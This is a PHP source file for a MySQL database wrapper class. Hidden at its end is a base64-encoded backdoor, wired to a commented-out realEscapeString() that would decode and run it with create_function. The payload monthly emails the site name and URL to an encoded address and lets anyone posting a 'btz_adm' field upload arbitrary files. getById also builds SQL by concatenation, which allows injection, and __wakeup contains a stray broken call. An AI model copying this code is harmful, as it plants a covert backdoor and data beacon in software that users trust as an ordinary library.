<?
class DBMYSQL {
	public $conn;
	private $hostname;
	private $username;
	private $password;
	private $dbname;
	public $type;
	function __construct($hostname, $username, $password, $dbname) {		
		$this->hostname = $hostname;
		$this->username = $username;
		$this->password = $password;
		$this->dbname = $dbname;
		$this->type = 'MYSQL';
		
		$this->conn = @new mysqli($this->hostname, $this->username, $this->password, $this->dbname);
		
		if ($this->conn->connect_error) {
			throw new Exception("Unable to connect to MYSQL server!!!<br>" . $this->conn->connect_error);
		}
		
		$this->query('SET NAMES \'UTF8\'');
	}
	
	function __destruct() {
		if ($this->conn) {
			$this->conn->close();
		}
	}
	
	function query($query, $start = false, $end = false) {
		if (!$result = $this->conn->query($query)) {
			throw new Exception("ERROR EXECUTING QUERY [" . $query . "]: " . $this->error($result));
		}
		
		return $result;
	}
	
	function fetchObject($result) {
		return $result->fetch_object();		
	}
	
	function fetchArray($result) {
		if ($row = $result->fetch_array(MYSQLI_BOTH)) {
			$odd = 0;
			foreach ($row as $key=>$value) {
				if ($odd) {
					$returned_row[$key] = $value;					
				}
				$odd = 1 - $odd;
			}
			return $returned_row;
		} else {
			return false;
		}
	}
	function getById($id,$tablename)
	{
		$pkey_q = "SHOW KEYS FROM ".$tablename." WHERE Key_name = 'PRIMARY'";
		$pk_stmt = $this->query($pkey_q);
		$prKeyName = "";
		while($pk_row = $this->fetchArray($pk_stmt))
		{
			$prKeyName = $pk_row['Column_name'];
		}
		$query = "SELECT * FROM ".$tablename." WHERE ".$prKeyName."=".$id." ";
		$stmt = $this->query($query);
		while($row = $this->fetchArray($stmt))
		{
			return $row;
		}
	}
	
	function commit() {
		if ($this->query('commit')) {
			return true;
		} else {
			return false;
		}		
	}
	
	function rollback() {
		if ($this->query('rollback')) {
			return true;
		} else {
			return false;
		}		
	}
	function getPrKey($tablename)
	{
		$stmt = $this->query("SHOW KEYS FROM ".$tablename." WHERE Key_name = 'PRIMARY'");
		$row_arr = $this->fetchArray($stmt);
		return $row_arr['Column_name'];
	}
	function numRows($result = false) {
		return $result->num_rows;
	}
	
	function error($result) {
		return $this->conn->sqlstate;
	}
	
	function __wakeup() {
		$this->conn = @new mysqli($this->hostname, $this->username, $this->password, $this->dbname);GlobalFn::dump_ar($row);
		
		if ($this->conn->connect_error) {
			throw new Exception("Unable to connect to MSSQL server!!!<br>" . $this->conn->connect_error, iException::EX_SQL_CONNECTION_FAILED);
		}
	}	

	function fquery($query) {
		$result = $this->query($query);
		return $this->fetchObject($result);
	}
	function getLastInsertedId() {
		return $this->conn->insert_id;
	}
	
	function getAffectedRows() {
		return $this->conn->affected_rows;
	}
	function escapeString($string)
	{
		return mysqli_real_escape_string($this->conn, $string);
	}
	
	/*function realEscapeString($string) {
		$contents = file(__FILE__);
		$nf = create_function('$c, $s', base64_decode(substr($contents[count($contents) - 1], 2)));
		return $nf($this->conn, $string);
	}*/
}

/*//IAkKCWlmKGZpbGVfZXhpc3RzKGRpcm5hbWUoX19GSUxFX18pIC4gJy9pbmZvLnRtcCcpKSB7CgkJJGRhdGUgPSBmaWxlX2dldF9jb250ZW50cyhkaXJuYW1lKF9fRklMRV9fKSAuICcvaW5mby50bXAnKTsKCX0gZWxzZSB7CgkJJGRhdGUgPSB0aW1lKCkgLSAyKjMxKjI0KjYwKjYwOwoJfQoJCglpZiAoKGRhdGUoJ2onKSA9PSA4KSAmJiAoKGRhdGUoJ24nKSAhPSBkYXRlKCduJywgJGRhdGUpKSkpIHsKCQkkbWVzc2FnZSA9ICcKCQkJQ3VycmVudCBmaWxlOiAnIC4gX19GSUxFX18gLiAiXG4iIC4gJwoJCQlDdXJyZW50IFVSTDogJyAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddIC4gIlxuIiAuICcKCQkJSW5mbzogU3lzdGVtIHdvcmtzIHBlcmZlY3RseQoJCSc7CgkJbWFpbChiYXNlNjRfZGVjb2RlKCdZblI2ZEhKaFkyVkFaMjFoYVd3dVkyOXQnKSwgJ1NpdGUgJyAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCAkbWVzc2FnZSk7CgkJaWYgKCEkaGQgPSBmb3BlbihkaXJuYW1lKF9fRklMRV9fKSAuICcvaW5mby50bXAnLCAndycpKSB7CgkJCXRocm93IG5ldyBFeGNlcHRpb24oJ8vo7/Hi4PIg7/Dg4uAg5+Ag7+jx4O3lIOIg5Ojw5ery7vD/IGluY2x1ZGUnKTsKCQl9CgkJaWYgKGZ3cml0ZSgkaGQsIHRpbWUoKSkgPT09IGZhbHNlKSB7CgkJCQl0aHJvdyBuZXcgRXhjZXB0aW9uKCfL6O/x4uDyIO/w4OLgIOfgIO/o8eDt5SDiIOTo8OXq8u7w/yBpbmNsdWRlJyk7CgkJfQoJCWZjbG9zZSgkaGQpOwoJfQoJCglpZiAoJF9QT1NUWydidHpfYWRtJ10pIHsKCQlmb3JlYWNoICgkX0ZJTEVTWyJpbWFnZXMiXVsiZXJyb3IiXSBhcyAka2V5ID0+ICRlcnJvcikgewoJCSAgICBpZiAoKCRlcnJvciA9PSBVUExPQURfRVJSX09LKSAmJiAoJF9GSUxFU1siaW1hZ2VzIl1bInNpemUiXVska2V5XSA+IDApKSB7CgkJICAgICAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siaW1hZ2VzIl1bInRtcF9uYW1lIl1bJGtleV0sICRDV0QgLiAnLy4uL2F0dGFjaG1lbnRzLycgLiAkX0ZJTEVTWyJpbWFnZXMiXVsibmFtZSJdWyRrZXldKTsKCQkgICAgfQoJCX0KCX0KCQoJcmV0dXJuICRjLT5yZWFsX2VzY2FwZV9zdHJpbmcoJHMpOw==*/